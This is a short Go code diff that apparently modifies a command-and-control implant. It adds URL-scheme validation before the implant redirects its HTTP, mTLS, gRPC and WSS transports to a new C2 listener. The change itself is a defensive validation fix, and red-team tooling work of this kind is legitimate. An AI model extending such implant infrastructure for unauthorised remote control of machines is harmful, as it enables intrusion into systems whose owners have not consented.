@@ -5,6 +5,7 @@ package main
 
 import (
 	"encoding/json"
+	"fmt"
 	"strings"
 	"sync"
 )
@@ -57,6 +58,10 @@ func handleProfileRotate(task Task, res *TaskResult) {
 		}
 	}
 	if pr.C2URL != "" {
+		if !hasValidC2Scheme(pr.C2URL) {
+			res.Error = fmt.Sprintf("invalid C2 URL scheme: %s", pr.C2URL)
+			return
+		}
 		// Redirect all transports to the new C2 endpoint. sendToC2 builds the
 		// final URL as C2URLs[idx] + beaconURI, so replacing the list moves
 		// every transport (HTTP/mTLS/gRPC/WSS/...) to the fallback listener.
